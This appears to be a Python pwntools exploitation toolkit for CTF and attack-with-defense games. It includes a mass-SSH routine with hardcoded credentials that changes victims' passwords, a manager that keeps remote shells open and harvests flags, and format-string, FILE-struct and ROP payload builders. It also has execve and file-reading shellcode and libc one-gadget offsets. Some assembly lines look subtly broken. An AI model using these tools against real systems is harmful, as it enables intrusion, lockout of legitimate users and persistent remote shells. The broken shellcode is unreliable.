# -*- coding:utf-8 -*-
from pwn import *

class Log:
    """docstring for Log
    just log for num

    """
    def __init__(self, s,addr):
        self.red(s,addr)

    @staticmethod
    def red(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    @staticmethod
    def green(s,addr):
        print('\033[1;32;40m%20s-->0x%x\033[0m'%(s,addr))
    @staticmethod
    def yellow(s,addr):
        print('\033[1;33;40m%20s-->0x%x\033[0m'%(s,addr)) 
    @staticmethod
    def blue(s,addr):
        print('\033[1;34;40m%20s-->0x%x\033[0m'%(s,addr))

class PWN:
    """
    :binary  binary_path
    :llibc  libc_path if u have
    :ld  ld_path if u have
    :aslr 

Usage:
    from q4n import *
    p=PWN("./elf","./libc","./ld")
    p.proc()  or p.remote("ip",port)
    p.sl()
    debugf()
    p.ia()   

Notice:
    假如加载多个函数库，那么libc将加载系统libc
    """    

    # 调试
    def debugf(self,breakpoint=""):
        try:
            log.info("libc: "+hex(self.libc.address))
            log.info("heap: "+hex(self.heapbase))
            log.info("stack: "+hex(self.stack))
        except:
            pass
        if self.REMOTE == 0:
            gdb.attach(self.r, breakpoint)
        # pause()

    # 创建连接的主要函数
    def run(self,ip=None,port=None):
        if ip and port:
            self.REMOTE=1
            self.r=remote(ip,port)
            # self.r=remote(ip,port,timeout=2)
        elif self.llibc and self.binary and self.ld:
            self.r=process([self.ld,self.binary],env={'LD_PRELOAD':self.llibc})            
        elif self.llibc and self.binary:
            self.r=process(self.binary,env={'LD_PRELOAD':self.llibc})
        else:
            self.r=process(self.binary)

    # 各种操作
    def sd(self,x):
        self.r.send(x)
    def sl(self,x):
        self.r.sendline(x)    
    def rv(self,x=4096):
        return self.r.recv(x)
    def ru(self,x='',drop=True):
        return self.r.recvuntil(str(x),drop=drop)
    def rl(self,):
        return self.r.recvline()
    def ia(self,):
        self.r.interactive()
    def ra(self,):
        return self.r.recvall()
    def sla(self,x,y):
        self.r.sendlineafter(x,y)
    def sa(self,x,y):
        self.r.sendafter(x,y)
    def close(self):
        self.r.close()
    def getflag(self,getshell=True,check_id=True):
        if getshell:
            if check_id:
                self.sl("id")
                if "uid" not in self.r.recvuntil("uid",drop=False,timeout=1):
                    log.error("All ready get shell?")
                    return
                self.rl()
            self.sl("cat flag")
            flag=self.rl()[:-1]
            return flag
        else:
            pass
    def exportflag(self,path):
        flag=self.getflag()
        with open(path,"a+") as f:
            f.write(flag+'\n')        

    # 创建连接
    def proc(self,):
        self.REMOTE=0
        self.run()
        try:
            self.libc=ELF(self.llibc)
        except:
            self.libc=self.elf.libc
    def remote(self,ip,port):
        self.run(ip,port)
        try:
            self.libc=ELF(self.llibc)
        except:
            self.libc=self.elf.libc

    def __init__(self,binary,llibc=None,ld=None,aslr=True,timeout=None):
        self.r=None
        self.elf=None
        self.libc=None

        self.binary=binary
        self.llibc=llibc
        self.ld=ld

        self.REMOTE=0
        # 用于标识是否debug

        self.stack=0
        self.heapbase=0

        if timeout:
            context.timeout=timeout

        try:
            self.elf=ELF(self.binary)
        except:
            pass
        finally:
            context(log_level='debug',os='linux',arch=self.elf.arch,aslr=aslr)        

# context.terminal=['tmux','new-window']
class BlindPWN(PWN):
    """ just connect to remote(2333 """
    def __init__(self,remote_ip,remote_port):
        self.run(remote_ip,remote_port)
        
import requests
class SUBMIT:
    """
    利用requests.post方法来提交flag
    s=SUBMIT("http://local/submit","mytoken","answer","TOKEN")
    s.submit("flag")
    """
    def __init__(self,url,token_value,flag_key='answer',token_key='TOKEN'):
        self.token_value=token_value
        self.url=url
        self.flag_key=flag_key
        self.token_key=token_key    
    def submit(self,flag_value):
        self.data = {self.flag_key: flag_value, self.token_key: self.token_value}
        try:   
            state = requests.post(self.url, data=self.data, timeout=3, verify=False).text
        except requests.Timeout:
            state = 'requests timeout'
        finally:
            print state
            print "--------------------- END ---------------------\n"

class IPLIST:
    # IPLIST('125-127-100.100-110.110-120.20-25').result --> List

    def __init__(self,ip):
        self.result=[]
        def iplist(ip_range):
            # ip_range: '125-127.100-110.110-120.20-25'
            tmp=ip_range.split('.')
            tmp_list=[]
            result=[]
            for i in tmp:
                if '-' in i:
                    tmp1=i.split('-')
                    if len(tmp1) == 2:
                        tmp_list.append((int(tmp1[0]),int(tmp1[1]),1))
                    elif len(tmp1)==3:
                        tmp_list.append((int(tmp1[0]),int(tmp1[1]),int(tmp1[2])))
                    else:
                        print("[-] Error ip_range!")
                        exit()
                else:
                    tmp_list.append((int(i),int(i)+1,1))
            for a in range(tmp_list[0][0],tmp_list[0][1],tmp_list[0][2]):
                for b in range(tmp_list[1][0],tmp_list[1][1],tmp_list[1][2]):
                    for c in range(tmp_list[2][0],tmp_list[2][1],tmp_list[2][2]):
                        for d in range(tmp_list[3][0],tmp_list[3][1],tmp_list[3][2]):
                            tmpip=".".join([str(a),str(b),str(c),str(d)])
                            result.append(tmpip)
            return result
        self.result=iplist(ip)

# from multiprocessing import Pool
class FUCKPASSWD:
    """docstring for FUCKPASSWD
    attack=FUCKPASSWD("172.192.168.14-18-2",timeout=2)
    attack.exploit()
    """
    def __init__(self, ip="192.168.111.14-18-2", port=22,user='wongyohoo', passwd="cz19990403", mypasswd='qazxswedc',timeout=None):
        if timeout:
            context(log_level='debug',timeout=timeout)
        # 如果知道其他的username和passwd, 批量修改!

        # ------------------ config ---------------------
        self.PORT=port
        self.USER=user
        self.PASSWD=passwd
        self.IP_RANGE=ip
        self.MY_PASSWD=mypasswd
        # ------------------ config ---------------------

    def fuck(self,ip):
        command=r"echo -e '"+self.PASSWD+r"\n"+self.MY_PASSWD+r"\n"+self.MY_PASSWD+r"""\n' | passwd """+self.USER+"\n"
        while True:
            r=None
            try:
                r = ssh(host=ip,port=self.PORT, user=self.USER, password=self.PASSWD,level=0)
                r.run(command)
                success("SUCCESS: "+ip)
            except Exception as e:
                info("Error: "+ip)
                break
                # continue
            finally:
                if r:
                    r.close()

    def exploit(self):
        ip_pool=IPLIST(self.IP_RANGE).result
        print(ip_pool)
        while True:
            for i in ip_pool:
                try:
                    self.fuck(i)
                except Exception:
                    continue

        # ps=Pool(20)
        # for i in ip_pool:
        #     ps.apply_async(fuck,args=(i,))
        # ps.close()
        # ps.join()


import threading
import os
import datetime
class PostPWN(threading.Thread):
    """
    post pwn when you getshell in awd, 
    when the challenge does not have `alarm` or `timeout`

    Usage: 
    def submit(flag):
        ...
    PostPWN([remote_object,], submit)
    """
    def __init__(self, shells,submit_function=None):
        """shell: the remote shells from pwntools"""
        # args: [remote1, remote2, ...]
        threading.Thread.__init__(self)
        self.shells=shells
        if submit_function:
            self.submit_function=submit_function
        else:
            self.submit_function=self.empty_func_error
        self.start()
        self.main()

    def main(self):
        # a menu to do sth
        while True:
            print("\033[37mWelcome to PostPWN")
            print("[1] auto submit flag")
            print("[2] submit flag")
            print("[3] get interactive shell")
            print("[4] info active ip")
            choice=0
            while True:
                try:
                    choice=raw_input("\033[33mMain> \033[37m")
                    choice=int(choice)
                    break
                except KeyboardInterrupt as e:
                    print("\033[36mBye~")
                    os._exit(0)
                except:
                    continue
            if choice==1:
                # can box the submit as class
                interval=0
                try:
                    interval=int(raw_input("\033[33mInterval> \033[37m"))
                    while True:
                        try:
                            self.submit_flag()
                        except KeyboardInterrupt:
                            break
                        except Exception as e:
                            print(e)
                            break
                        print("\033[32m[%s] submit_flag Done!"%(datetime.datetime.now().strftime('%T')))
                        sleep(interval)
                except KeyboardInterrupt:
                    continue
                
            elif choice == 2:
                try:
                    self.submit_flag()
                    print("\033[32m[%s] submit_flag Done!"%(datetime.datetime.now().strftime('%T')))    
                except Exception as e:
                    print(e)
                    continue
            elif choice==3:
                self.interactive_shell()
            elif choice == 4:
                print("\033[37mActive ip: ")
                for i in [shell.rhost for shell in self.shells]:
                    print("[*] \033[32m%s"%i)
                print("\033[37m[\033[32m+\033[37m] have %d shells in all\n"%len(self.shells))

    def deamon(self):
        print("\033[37mActive ip: \033[32m%s \033[37m"%str([shell.rhost for shell in self.shells]))
        for shell in self.shells:
            shell.sendline("echo isActive")
            shell.sendline("/bin/sh")
            if "isActive" in shell.recv(1024):
                continue
            else:
                self.shells.remove(shell)
                info("IP: \033[31m%s:%d \033[38mis not active"%(shell.rhost,shell.rport))
        sleep(20)

    def get_flag(self):
        flags=[]
        for shell in self.shells:
            shell.sendline("echo getflag")
            shell.recvuntil("getflag\n")
            shell.sendline("cat flag")
            flags.append(shell.recvline()[:-1])
            shell.recv(1024)
        return flags

    def empty_func_error(self,pad):
        # check error
        print("\033[32m[*] submit: %s\033[37m"%pad)
        error("plz give me a function like `submit(flag)` to submit_flag!")


    def submit_flag(self):
        # func: a function like submit(flag)
        flags=self.get_flag()
        print("\n\033[37m-------------Bullet: -----------")
        for i in flags:
            print(i)
        print("--------------------------------\n")
        for i in flags:
            self.submit_function(i)
        # print("\033[32m[+] submit_flag has done!")

    def interactive_shell(self):
        print("Choose one to get interactive_shell: ")
        for i in range(len(self.shells)):
            print("[%d] %s:%d"%(i,self.shells[i].rhost,self.shells[i].rport))
        tmp_shell=None
        try:
            pyin=raw_input("\033[33mChoice> \033[37m")
            tmp_shell=self.shells[int(pyin)]
            tmp_shell.interactive()
        except KeyboardInterrupt as e:
            print("\033[31m[-] KeyboardInterrupt!\033[38m")
            return
        except:
            print("\033[31m[-] Some error!\033[38m")
        finally:
            # to fix a bug
            if tmp_shell not in self.shells and tmp_shell:
                self.shells.append(tmp_shell)

    def run(self):
        # deamon_wrappe
        while True:
            self.deamon()

import math
def Fmt(offset, address,value,flag=1,per_byte='byte',padding_char='\x00',bits=64,full_write=1):
    """Fmt(offset, address,value,flag=1,per_byte='byte',padding_char='\x00',bits=64,full_write=1) --> str
    Arguments:
        offset: fmt string's offset
        address: 
        value: 
        flag: 
            1: return fmtstr+address
            0: return address+fmtstr, but sometimes it will crash
        per_byte: ``byte``, ``short`` or ``int``
        padding_char: char for padding in the mid
        bits: the architecture, only support 64 or 32
        full_write: write the full target align to int32(int64) or not
    PS:
        set context.arch is better
    """
    s2i=lambda x: int(math.log(x,2))
    if bits==64:
        arch_num=8
    else:
        arch_num=4
    payload=''
    if flag:
        # return fmtstr+address
        if per_byte=='byte':
            # just hard coding
            pbyte=1
            real_length=0x60*arch_num/8

        elif per_byte=='short':
            pbyte=2
            real_length=0x38*arch_num/8 # 0x30

        elif per_byte=='int':
            pbyte=4
            real_length=0x30*arch_num/8 # 0x22

        idx_off=real_length/arch_num
        tmp=value
        value_grp=[0,]
        while tmp!=0:
            value_grp.append(tmp&(0x100**pbyte-1))
            tmp/=0x100**pbyte

        if full_write:
            while len(value_grp)!=arch_num/pbyte+1:
                value_grp.append(0)
        
        for i in range(len(value_grp)):
            if i==0:
                continue
            payload+="%"+str((value_grp[i]+0x100**pbyte-value_grp[i-1]))+"c"
            payload+="%"+str(offset+i+idx_off-1)+"$"+'h'*(2-s2i(pbyte))+"n"

        payload=payload.ljust(real_length,padding_char)
        for i in range(len(value_grp)-1):
            if bits==64:
                payload+=p64(address+i*pbyte)    
            elif bits==32:
                payload+=p32(address+i*pbyte)    
    else:
        # return address+fmtstr, and sometimes it will crash
        return fmtstr_payload(offset,{address,value},write_size=per_byte)
    return payload

def pack_file32(
        _flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0,
    ):
    file_struct=p32(_flags) + \
                p32(_IO_read_ptr) + \
                p32(_IO_read_end) + \
                p32(_IO_read_base) + \
                p32(_IO_write_base) + \
                p32(_IO_write_ptr) + \
                p32(_IO_write_end) + \
                p32(_IO_buf_base) + \
                p32(_IO_buf_end) + \
                p32(_IO_save_base) + \
                p32(_IO_backup_base) + \
                p32(_IO_buf_end) +\
                p32(_IO_marker)+\
                p32(_IO_chain) + \
                p32(_fileno)
    file_struct=file_struct.ljust(0x48,'\x00')
    file_struct+=p32(_lock)
    file_struct=file_struct.ljust(0x94,'\x00')
    return file_struct

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
            p32(0) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct
    
def payload_IO_str_finish(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr,offset=-8):
    """
    house of orange
    溢出被free的unsortbin的结构
    offset为执行IO_str_jumps中的对应函数对应的偏移
    """
    payload = pack_file(_flags = 0, #prev size
                    _IO_read_ptr = 0x61, #smallbin4file_size
                    _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,
                    _IO_write_base = 0,
                    _IO_write_ptr = 1,
                    _IO_buf_base = binsh_addr,
                    _mode = 0,
                    )
    payload += p64(_IO_str_jumps_addr+offset)
    payload += p64(0) # paddding
    payload += p64(system_addr)
    return payload

def payload_IO_str_overflow(_IO_str_jumps_addr,_IO_list_all_ptr,system,bin_sh_addr,i=0,offset=0):
    if i==0:
        bin_sh_addr+=5 #使用sh来使binsh的地址为偶数，防止溢出
    payload=pack_file(
    _IO_buf_end = (bin_sh_addr - 0x64) / 2,
    _IO_buf_base = 0,
    _IO_write_ptr=0xffffffffffff0000,
    _IO_write_base =0,
    _mode = 0,
    _IO_read_ptr = 0x61, 
    _IO_read_base = _IO_list_all_ptr-0x10, 
    _flags=0
    )
    payload+=p64(_IO_str_jumps_addr+offset)+p64(system)
    return payload

def payload_IO_str_overflow(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr,offset=4):
    """IO_list_all的值应当为可读可写，一般为file结构的结束地址即可（不是用于houseoforange）"""
    payload=pack_file32(
        _IO_buf_end = (binsh_addr - 0x64) / 2,
        _IO_write_base=1,
        _lock=_IO_list_all_ptr,
        _IO_read_base=0, #_IO_list_all_ptr-0x8,
        _IO_read_ptr = 0,#0x61, #未完待续，用于houseoforange
    )
    payload+=p32(_IO_str_jumps_addr+offset)+p32(system_addr)
    return payload

    
# libc 2.23
one=[0x45216, 0x4526a, 0xf02a4, 0xf1147, 0xcd0f3, 0xcd1c8, 0xf02b0, 0xf66f0]

def ioleak(is32=False):
    if is32:
        # 0x11 bytes
        return p32(0xfbad3887)+p32(0)*3+'\x00'
    else:
        # 0x21 bytes
        return p64(0xfbad3887)+p64(0)*3+'\x00'

def csu( ptr2retaddr, rdx, rsi, edi, last_ret,padding, is32=False,rbx=0, rbp=1):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call(a point like got)
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    # padding is stack padding after call [r12] --> will ret to some addr
    # 想要再次控制rop, [r12] 这个地址至少需要一个pop ret, 那么padding=0即可
    if not is32:
        payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(ptr2retaddr) + p64(rdx) + p64(rsi) + p64(edi)
        payload += p64(csu_front_addr)
        payload += '\xff' * padding
        payload += p64(last_ret)
        return payload
    else:
        # unsure :)
        payload = p32(csu_end_addr) + p32(rbx) + p32(rbp) + p32(ptr2retaddr) + p32(rdx) + p32(rsi) + p32(edi)
        payload += p32(csu_front_addr)
        payload += '\xff' * padding
        payload += p32(last_ret)
        return payload

def gedget1(addr,retaddr):
    # 这个gadget需要控制rbp和栈, 就可以实现花式栈溢出, 用加减法来写libc地址, 可结合csu食用
    # 位于_do_global_dtors_aux+8的位置
    # adc dword ptr [rbp+0x48],edx
    return p64(addr)+p64(0xdeadbeef)+p64(retaddr)

def gadget2(addr):
    # 这个gadget控制所有的寄存器, 但是需要首先控制一个寄存器
    # 测试环境为 rdi, 其他的自行fix
    # 位于libc中,大概 0x47b75 的位置(2.23), setcontext函数末尾
# .text:0000000000047B75                 mov     rsp, [rdi+0A0h]
# .text:0000000000047B7C                 mov     rbx, [rdi+80h]
# .text:0000000000047B83                 mov     rbp, [rdi+78h]
# .text:0000000000047B87                 mov     r12, [rdi+48h]
# .text:0000000000047B8B                 mov     r13, [rdi+50h]
# .text:0000000000047B8F                 mov     r14, [rdi+58h]
# .text:0000000000047B93                 mov     r15, [rdi+60h]
# .text:0000000000047B97                 mov     rcx, [rdi+0A8h]   
# .text:0000000000047B9E                 push    rcx
# .text:0000000000047B9F                 mov     rsi, [rdi+70h]
# .text:0000000000047BA3                 mov     rdx, [rdi+88h]
# .text:0000000000047BAA                 mov     rcx, [rdi+98h]
# .text:0000000000047BB1                 mov     r8, [rdi+28h]
# .text:0000000000047BB5                 mov     r9, [rdi+30h]
# .text:0000000000047BB9                 mov     rdi, [rdi+68h]
# .text:0000000000047BBD                 xor     eax, eax
# .text:0000000000047BBF                 retn
    # rcx为返回地址, rdi为可控指针
    return p64(addr+0x47b75)

def execve(is32=False,multi_arch=0):
    multi="""
xor esi, esi                  
mul esi                       
push rdx                        
push rdx                        
push rdx                        
push rsp                       
pop rbx                         
ush rbx                        
pop rdi                         
mov dword [rdi], 0x6e69622f     
mov dword [rdi+0x4], 0x68732f2f 
jnz 0x1f                        
mov al, 0x3b                  
syscall                         
xor ecx, ecx                   
mov al, 0xb                     
int 0x80      
"""
    if multi_arch:
        return asm(multi,arch="amd64")
    # 20byte         
    code32="""
xor    ecx,ecx
push   0xb
pop    eax
push   ecx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
"""
    shellcode_sh_i386=asm(code32,arch="i386")
    # 22byte
    code64="""
xor 	rsi,	rsi			
push rsi
mov 	rdi,	0x68732f2f6e69622f
push rdi
push rsp
pop rdi
mov al,0x3b
cdq
syscall
"""
    shellcode_sh_x64=asm(code64,arch="amd64")
    if is32:
        return shellcode_sh_i386
    else:
        return shellcode_sh_x64

def readflag(is32=False):
    # 可以将所有的mov指令转换为push pop减小shellcode大小
    if is32:
        code = """
xor ecx,ecx
mov eax,SYS_open
call here
.string "./flag"
.byte 0
here:
pop ebx
int 0x80
mov ebx,eax
mov ecx,esp
mov edx,0x100
mov eax,SYS_read
int 0x80
mov ebx,1
mov ecx,esp
mov edx,0x100
mov eax,SYS_write
int 0x80
mov eax,SYS_exit
int 0x80
"""
        # 65
        return asm(code,arch="i386")
    else:
        code = """
xor rsi,rsi
mov rax,SYS_open
call here
.string "/flag"
here:
pop rdi
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x100
mov rax,SYS_read
syscall
mov rdi,1
mov rsi,rsp
mov rdx,0x100
mov rax,SYS_write
syscall
mov rax,SYS_exit
syscall
"""
        return asm(code,arch="amd64")


def execveat():
    # 这个shellcode从文件读取输入,无文件执行从stdin输入到内存的文件
    code=shellcraft.pushstr("Q4n")+"""
mov rax,319
mov rdi,rsp
xor rsi,rsi
syscall
mov rbx,rax
loop:
xor rdi.rdi
mov rsi,rsp
mov rdx,0x400
xor rax.rax
syscall
cmp rax,0
je go
mov rdi,rbx
mov rsi,rsp
mov rdx,rax
xor rax,rax
inc rax

syscall
jmp loop
go:
mov rdi,rbx
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
"""
    return asm(code,arch="amd64")



def dlresolve(bin_path):
    print "warning: just a template"
    # from roputils import *
    # from pwn import process
    # from pwn import gdb
    # from pwn import context
    # from pwn import remote
    # r = process('./main')
    # context.log_level = 'debug'
    # rop = ROP(bin_path)
    # offset = 112
    # bss_base = rop.section('.bss')
    # # first: ROP chain
    # buf = rop.fill(offset)
    # # read the fake struct into memory
    # buf += rop.call('read', 0, bss_base, 100)
    # # used to call dl_Resolve(function_name, args_ptr)
    # buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    # r.send(buf)
    # # second: write the fake struct into bss
    # buf = rop.string('/bin/sh')
    # buf += rop.fill(20, buf)
    # buf += rop.dl_resolve_data(bss_base + 20, 'system')
    # buf += rop.fill(100, buf)
    # r.send(buf)

